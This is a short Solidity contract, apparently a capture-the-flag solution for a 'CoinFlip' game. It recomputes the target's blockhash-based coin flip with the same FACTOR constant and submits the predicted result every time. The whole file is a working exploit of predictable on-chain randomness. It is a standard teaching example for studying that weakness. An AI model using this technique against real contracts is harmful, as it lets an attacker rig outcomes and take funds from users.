import './ICoinFlip.sol';

contract CoinFlipGuesser {
    ICoinFlip private immutable _coinFlipInstance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(
        ICoinFlip coinFlipInstance
    ) {
        _coinFlipInstance = coinFlipInstance;
    }

    function guessCoinFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(guess);
    }
}